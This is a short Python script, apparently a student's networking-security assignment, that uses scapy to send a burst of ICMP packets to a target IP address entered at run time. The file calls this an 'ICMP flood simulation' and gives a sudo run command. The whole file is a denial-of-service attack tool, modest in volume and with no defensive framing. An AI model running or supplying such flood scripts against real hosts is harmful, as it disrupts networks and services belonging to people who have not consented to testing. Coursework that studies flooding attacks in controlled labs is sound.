"""zainab saad
    202472448"""
from scapy.all import IP, ICMP, send, RandIP
from main_config import validate_ip
# sudo python3 path_to_file/icmp_flood.py

target_ip = validate_ip("Enter target IP: ")


def icmp_flood(target_ip):
    # create IP layer that has target ip as destination
    ip_layer = IP(dst=target_ip)

    # create ICMP layer
    icmp_layer = ICMP()
        
    # combine packet together
    packet = ip_layer / icmp_layer
    for i in range(1,200):
        # send ICMP packet
        send(packet, verbose=False)


# Start the ICMP flood simulation
icmp_flood(target_ip)
